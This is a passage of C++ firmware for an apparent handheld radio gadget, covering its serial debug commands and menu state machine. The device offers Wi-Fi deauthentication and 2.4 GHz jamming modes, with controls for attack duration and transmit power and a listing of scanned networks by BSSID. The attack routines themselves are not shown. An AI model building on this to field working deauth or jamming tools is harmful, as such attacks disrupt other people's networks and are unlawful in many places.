    if (!ev.valid() && Serial.available()) {
        char c = (char)Serial.read();
        switch (c) {
        case 'l': ev = {Btn::LEFT,   BtnEvent::PRESS};  break;
        case 'r': ev = {Btn::RIGHT,  BtnEvent::PRESS};  break;
        case 'D': ev = {Btn::SELECT, BtnEvent::PRESS};  break;
        case 'd': ev = {Btn::SELECT, BtnEvent::LONG};   break;
        case 'x': ev = {Btn::SELECT, BtnEvent::LONG};   break;
        case '1': case '2': case '3': case '4': case '5':
        case '6': case '7': case '8': case '9':
#if WIFI_DEAUTH_ENABLE
            if (ui == UIState::DEAUTH) {
                dauth_cap_ms = (uint32_t)(c - '0') * 10000;   // 10..90 s
                Serial.printf("DEAUTH CAP %lu ms\n", (unsigned long)dauth_cap_ms);
            }
#endif
#if JAM_ENABLE
            else if (ui == UIState::JAM) {
                jam_cap_ms += 30000;
                if (jam_cap_ms > 300000) jam_cap_ms = 30000;   // 30 s .. 5 min
                Serial.printf("JAM CAP %lu ms\n", (unsigned long)jam_cap_ms);
            }
#endif
            break;
#if WIFI_DEAUTH_ENABLE
        case 's': {
            // Dump the current scan list (index, ssid, bssid, chan, rssi).
            const wifi_ble::ScanResult *r = wifi_ble::result();
            Serial.printf("DEAUTH DBG scanning=%d have=%d count=%d\n",
                          (int)wifi_ble::scanning(), (int)dauth_have_result,
                          r ? r->count : -1);
            if (!r || r->count == 0) { Serial.println("DEAUTH LIST (empty)"); break; }
            for (int i = 0; i < r->count; ++i)
                Serial.printf("DEAUTH LIST %d%s: %-14s %s ch=%d rssi=%d\n",
                              i, (i == dauth_sel) ? "*" : " ",
                              r->nets[i].ssid[0] ? r->nets[i].ssid : "(hidden)",
                              r->nets[i].bssid, r->nets[i].chan, r->nets[i].rssi);
            break;
        }
        case 'p':
            if (dauth_tx_power > 8) dauth_tx_power -= 4;   // 1 dB step down
            deauth::set_tx_power(dauth_tx_power);
            Serial.printf("DEAUTH TXPOWER %d (0.25dBm)\n", (int)dauth_tx_power);
            break;
#endif
#if JAM_ENABLE
        case 'R': {
            // RPD self-test: B transmits a constant carrier on ch 40; A (RX
            // mode) sweeps 38-42 and must flag 40. No TX if A is missing.
            Serial.println("RPD SELFTEST start");
            if (radios::probe(0).present) {
                radios::start_session(1);
                radios::carrier_on(1, RF24_PA_MAX, 40);
                delay(300);
                radios::start_rx(0);
                for (int c = 38; c <= 42; ++c) {
                    bool hit = radios::scan_channel(0, (uint8_t)c);
                    Serial.printf("RPD SELFTEST ch=%d rpd=%d\n", c, hit);
                    delay(20);
                }
                radios::carrier_off(1);
            } else {
                Serial.println("RPD SELFTEST skipped: no radio A");
            }
            radios::power_down_all();
            Serial.println("RPD SELFTEST done");
            break;
        }
        case 'W': {
            // Band sweep: A (RX mode) probes ch 2-80, ~5 ms dwell; prints
            // hot channels. Safe: power_down_all at the end.
            Serial.println("RPD SWEEP start");
            if (radios::probe(0).present) {
                radios::start_rx(0);
                int hot = 0;
                for (int c = 2; c <= 80; ++c) {
                    bool hit = radios::scan_channel(0, (uint8_t)c);
                    if (hit) { Serial.printf("RPD SWEEP ch=%d HOT\n", c); ++hot; }
                    delay(5);
                }
                Serial.printf("RPD SWEEP done hot=%d/79\n", hot);
            } else {
                Serial.println("RPD SWEEP skipped: no radio A");
            }
            radios::power_down_all();
            break;
        }
        case 'E': {
            // Raw RSSI sweep: prints the GRADED register (0x0F) per channel.
            // 64 = no signal, lower = stronger. Diagnostics: if the room's
            // Wi-Fi channels (e.g. 12/22) show low values while the RPD
            // sweep found nothing, the signal is present but the binary RPD
            // doesn't latch it (OFDM vs GFSK) — the MAP should use RSSI.
            Serial.println("RSSI SWEEP start (64=no signal, lower=stronger)");
            if (radios::probe(0).present) {
                radios::start_rx(0);
                int min_v = 64, min_ch = -1;
                for (int c = 2; c <= 80; ++c) {
                    int v = radios::raw_rssi(0, (uint8_t)c);
                    Serial.printf("RSSI ch=%d v=%d\n", c, v);
                    if (v < min_v) { min_v = v; min_ch = c; }
                    delay(5);
                }
                Serial.printf("RSSI SWEEP done min=%d@ch%d\n", min_v, min_ch);
            } else {
                Serial.println("RSSI SWEEP skipped: no radio A");
            }
            radios::power_down_all();
            break;
        }
#endif
        default: break;
        }
    }
#endif
    led_tick(now);

    switch (ui) {
    case UIState::MENU:
        if (ev.valid() && ev.btn == Btn::LEFT && ev.ev == BtnEvent::PRESS)   { menu_sel = (menu_sel + kMenuN - 1) % kMenuN; paint_menu(); }
        else if (ev.valid() && ev.btn == Btn::RIGHT && ev.ev == BtnEvent::PRESS) { menu_sel = (menu_sel + 1) % kMenuN; paint_menu(); }
        else if (ev.valid() && ev.btn == Btn::SELECT && ev.ev == BtnEvent::PRESS) {
            switch (menu_sel) {
            case 0: ui = UIState::PROXIMITY;   prox_enter();            break;
#if WIFI_DEAUTH_ENABLE
            case 1: ui = UIState::DEAUTH;      dauth_enter();           break;
#if JAM_ENABLE
            case 2: ui = UIState::JAM;         jam_enter();             break;
            case 3: ui = UIState::SETTINGS;    set_sel = 0; paint_settings(); break;
            case 4: ui = UIState::ABOUT;       paint_about();           break;
            case 5: ui = UIState::DIAGNOSTICS; run_diagnostics(); paint_diagnostics(); break;
#else
            case 2: ui = UIState::SETTINGS;    set_sel = 0; paint_settings(); break;
            case 3: ui = UIState::ABOUT;       paint_about();           break;
            case 4: ui = UIState::DIAGNOSTICS; run_diagnostics(); paint_diagnostics(); break;
#endif
#else
#if JAM_ENABLE
            case 1: ui = UIState::JAM;         jam_enter();             break;
            case 2: ui = UIState::SETTINGS;    set_sel = 0; paint_settings(); break;
            case 3: ui = UIState::ABOUT;       paint_about();           break;
            case 4: ui = UIState::DIAGNOSTICS; run_diagnostics(); paint_diagnostics(); break;
#else
            case 1: ui = UIState::SETTINGS;    set_sel = 0; paint_settings(); break;
            case 2: ui = UIState::ABOUT;       paint_about();           break;
            case 3: ui = UIState::DIAGNOSTICS; run_diagnostics(); paint_diagnostics(); break;
#endif
#endif
            }
        }
        break;

    case UIState::DIAGNOSTICS:
        if (ev.valid() && ev.ev == BtnEvent::LONG) { ui = UIState::MENU; paint_menu(); }
        break;

    case UIState::PROXIMITY:
        prox_tick(now, ev);
        break;

#if WIFI_DEAUTH_ENABLE
    case UIState::DEAUTH:
        dauth_tick(now, ev);
        break;
#endif
#if JAM_ENABLE
    case UIState::JAM:
        jam_tick(now, ev);
        break;
#endif

    case UIState::SETTINGS:
        if (ev.valid() && ev.btn == Btn::SELECT && ev.ev == BtnEvent::PRESS) {
            set_save_failed = false;
            set_sel = (set_sel + 1) % 3;   // pick which setting to edit
        } else if (ev.valid() && ev.btn == Btn::LEFT && ev.ev == BtnEvent::PRESS) {
            // lower value of the selected setting (wrap)
            if (set_sel == 0) S.led_enabled = !S.led_enabled;
            else if (set_sel == 1) S.led_brightness = (S.led_brightness <= 10) ? 100 : (uint8_t)(S.led_brightness - 10);
            else S.tx_pa_max = !S.tx_pa_max;
        } else if (ev.valid() && ev.btn == Btn::RIGHT && ev.ev == BtnEvent::PRESS) {
            // higher value of the selected setting (wrap)
            if (set_sel == 0) S.led_enabled = !S.led_enabled;
            else if (set_sel == 1) S.led_brightness = (S.led_brightness >= 100) ? 10 : (uint8_t)(S.led_brightness + 10);
            else S.tx_pa_max = !S.tx_pa_max;
        } else if (ev.valid() && ev.ev == BtnEvent::LONG) {
            if (!settings::save(S)) {
                set_save_failed = true;
                Serial.println("SETTINGS SAVE FAILED");
                break;
            }
            set_save_failed = false;
            ui = UIState::MENU;
            paint_menu();
            break;
        }
        // apply live
        led::set_enabled(S.led_enabled);
        led::set_brightness(S.led_brightness);
#if WIFI_DEAUTH_ENABLE
        // Global TX PA (all TX functions): Wi-Fi deauth base power —
        // MAX = 84 (20.75 dBm), HIGH = 72 (18 dBm).
        deauth::set_tx_power(S.tx_pa_max ? 84 : 72);
#endif
        paint_settings();
        break;

    case UIState::ABOUT:
        if (ev.valid() && ev.ev == BtnEvent::LONG) { ui = UIState::MENU; paint_menu(); }
        break;
    }
}
